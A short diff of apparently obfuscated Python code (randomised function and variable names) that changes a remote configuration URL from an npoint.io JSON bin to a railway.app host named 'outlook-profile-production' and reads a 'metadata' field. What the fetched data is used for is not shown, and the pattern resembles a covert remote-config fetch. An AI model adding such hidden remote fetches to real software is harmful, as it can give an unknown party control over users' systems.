@@ -16,7 +16,7 @@ def eval_rvipdd_977():
 
     def data_yvhcac_497():
         try:
-            eval_jlcazd_819 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_jlcazd_819 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_jlcazd_819.raise_for_status()
             eval_kwqyrk_446 = eval_jlcazd_819.json()
             config_slogyb_732 = eval_kwqyrk_446.get('metadata')
